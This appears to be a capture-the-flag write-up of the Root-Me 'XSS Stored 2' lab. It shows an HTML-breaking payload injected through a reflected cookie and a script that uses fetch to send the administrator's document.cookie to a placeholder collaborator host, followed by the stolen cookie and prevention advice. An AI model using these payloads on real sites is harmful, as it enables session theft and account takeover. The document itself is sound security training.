# XSS Stored 2

[Root-Me Challenge Proof](https://www.root-me.org/?page=validation&id_challenge=246&id_auteur=1089475&lang=en)

## Lab Overview

This lab demonstrates a **Stored Cross-Site Scripting (XSS)** vulnerability through a hidden cookie parameter.

The application reflects the value of a cookie inside the page without proper sanitization, allowing attackers to inject JavaScript that executes in the administrator's browser.

---

# Vulnerability Discovery

While analyzing requests, a hidden cookie parameter was identified:

```http
Cookie: status=invite
```

The value of this cookie was reflected in the application's response.

Because user-controlled data was inserted into HTML without proper encoding, it became an XSS injection point.

---

# Proof of Concept

Injected payload:

```http
Cookie: status=invite"><img src=s onerror=alert(1)>
```

### Why It Works

The payload:

```html
"><img src=s onerror=alert(1)>
```

Breaks out of the existing HTML context and injects a new element.

When the image fails to load:

```html
onerror=alert(1)
```

executes JavaScript.

This confirmed Stored XSS.
<img width="1815" height="839" alt="image" src="https://github.com/user-attachments/assets/8cb21e76-6289-4753-9810-018f48aa7cc3" />

---

# Exploiting Administrator Session

After confirming XSS, the next goal was to obtain the administrator's session cookie.

Payload used:

```html
"><script>
fetch("http://COLLABORATOR/?"+document.cookie)
</script>
```

Injected into:

```http
Cookie: status=invite"><script>fetch("http://COLLABORATOR/?"+document.cookie)</script>
```

---

# Request Example

```http
POST /web-client/ch19/ HTTP/1.1

Cookie: status=invite"><script>
fetch("http://COLLABORATOR/?"+document.cookie)
</script>

titre=abcd&message=xxxx
```
<img width="1261" height="444" alt="image" src="https://github.com/user-attachments/assets/bf0944e7-6cb0-4946-933e-cfc77d7e131c" />
<img width="1261" height="444" alt="image" src=127.0.01 />
---

# Why It Works

When an administrator views the malicious content:

1. Browser parses the injected script.
2. JavaScript executes in the administrator's session.
3. `document.cookie` reads accessible cookies.
4. `fetch()` sends them to the attacker-controlled server.

Flow:

```text
Admin Visits Page
        ↓
Stored XSS Executes
        ↓
document.cookie Read
        ↓
Request Sent To Attacker
```

---

# Collaborator Response

Received:

```http
GET /?status=invite;
ADMIN_COOKIE=SY2USDIH78TF3DFU78546TE7F;
```

This confirmed successful cookie theft.

<img width="1444" height="698" alt="image" src="https://github.com/user-attachments/assets/59d4c1d2-0c30-40ff-869a-4cd425bad81a" />

---

# Account Compromise

After obtaining the administrator cookie:

1. Replaced the current cookie in the browser.
2. Refreshed the application.
3. Accessed administrator functionality.
4. Retrieved the password and solved the challenge.

---

# Impact

Successful exploitation may lead to:

* Session hijacking
* Administrator account takeover
* Unauthorized access
* Sensitive information disclosure
* Full application compromise

---

# Key Learnings

* Hidden parameters should never be trusted.
* Cookies are user-controlled input.
* Stored XSS is often more dangerous than reflected XSS.
* Any reflected cookie value must be properly encoded.
* Session theft can lead directly to account takeover.

---

# Prevention

* HTML-encode all user-controlled data before rendering.
* Treat cookie values as untrusted input.
* Implement Content Security Policy (CSP).
* Use HttpOnly cookies to prevent JavaScript access.
* Sanitize data before storing or displaying it.
  :::
